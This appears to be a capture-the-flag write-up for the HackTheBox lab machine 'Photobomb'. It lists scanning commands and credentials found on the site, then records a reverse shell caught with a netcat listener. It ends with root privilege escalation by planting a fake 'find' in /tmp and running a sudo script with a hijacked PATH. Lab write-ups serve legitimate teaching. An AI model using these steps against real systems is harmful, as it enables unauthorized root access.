

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image.png)

# Enumeration:

### Port Scanning:

```bash
rustscan -a 10.129.228.60 -- -sC -sV
```

![Screenshot from 2025-01-02 16-02-11.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/Screenshot_from_2025-01-02_16-02-11.png)

### Directory Fuzzing:

```bash
feroxbuster -u http://photobomb.htb/
```

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%201.png)

### Web Application:

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%202.png)

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%203.png)

### Credentials : 
`pH0t0:b0Mb!`

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%204.png)

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%205.png)

### **Comman Injuction:**

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%206.png)

```bash
nc -lnvp 7777                      
listening on [any] 7777 ...
connect to [10.10.14.51] from (UNKNOWN) [10.129.228.60] 59194
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ ^Z
zsh: suspended  nc -lnvp 7777
```

```bash
stty raw -echo ;fg    
[1]  + continued  nc -lnvp 7777

wizard@photobomb:~/photobomb$
```

```bash
wizard@photobomb:~/photobomb$ cd /home
wizard@photobomb:/home$ cd wizard/
wizard@photobomb:~$ ls
photobomb  user.txt
```

### **Privilege Escalation:**

```bash
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

```bash
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

```bash
wizard@photobomb:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
wizard@photobomb:~$ cd /tmp  
wizard@photobomb:/tmp$ vim find

#!/bin/bash
bash
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
"find" [New] 2L, 17C written

wizard@photobomb:/tmp$ cat find 
#!/bin/bash
bash
```

```bash
wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
wizard@photobomb:/tmp$ chmod +x find
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

```bash
root@photobomb:/home/wizard/photobomb# id 
uid=0(root) gid=0(root) groups=0(root)
```

![image.png](Photobomb-D3p4k%2016f79dbf6729809b8ec8ea201feb7bac/image%207.png)